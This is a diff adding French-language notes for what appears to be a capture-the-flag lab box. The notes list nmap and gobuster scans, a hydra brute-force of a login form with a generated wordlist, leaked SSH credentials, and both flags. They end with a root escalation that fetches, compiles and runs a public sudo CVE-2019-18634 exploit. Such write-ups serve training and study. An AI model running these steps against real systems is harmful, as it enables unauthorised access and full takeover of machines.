@@ -1,0 +1,58 @@
+
+ip machine a attaqueé : 10.10.95.126
+
+ping 10.10.95.126
+=> notre vm connecté a celle a attaqué
+
+nmap -vv 10.10.95.126 -p-
+=> 22, 80 et 8080
+=> 2 sites web a vérifié: http://10.10.95.126:80 & http://10.10.95.126:8080
+=> 2 memes sites avec boutton login peut être injection
+
+gobuster dir -u http://10.10.95.126 -w Desktop/wordlists/dirb/common.txt
+=> vérifier les redirection de la page internet
+=> imgs, login & notes
+=> rien avec gobuster et rien dans les pages web
+
+user = elliot
+cliquer sur forget password :  
+===> Remember the company policy: color + two digits number 
+ ===>hint: All is not black or white 
+ seq -f "darkgray%02.0f" 00 99 > wordlist.txt
+ hydra -l elliot -P wordlist.txt <ip> http-form-post "/api/user/login:username=^USER^&password=^PASS^:error"
+  ===>[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray00
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray03
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray14
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray15
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray01
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray02
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray37
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray12
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray37
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray04
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray06
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray09
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray07
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray13
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray05
+[80][http-post-form] host: 10.10.254.244   login: elliot   password: darkgray08
+
+essaie de mdp:
+===> darkgray37 == good
+My ssh pass Im_M1st3r_R0b0T
+ssh elliot@ip
+mdp = My ssh pass Im_M1st3r_R0b0T
+cat user.txt
+===>EPI{H3Ll0_Fr13Nd}
+
+https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
+copy on the vm
+
+compile : gcc -o binary exploit.c
+scp -P 22 binary elliot@[ton_ip]:/home/elliot
+
+exe le binary sur le ssh
+on est root
+cat ../../root/root.txt
+=> EPI{C0nTr0L_Is_4N_Il7uS10n}
+
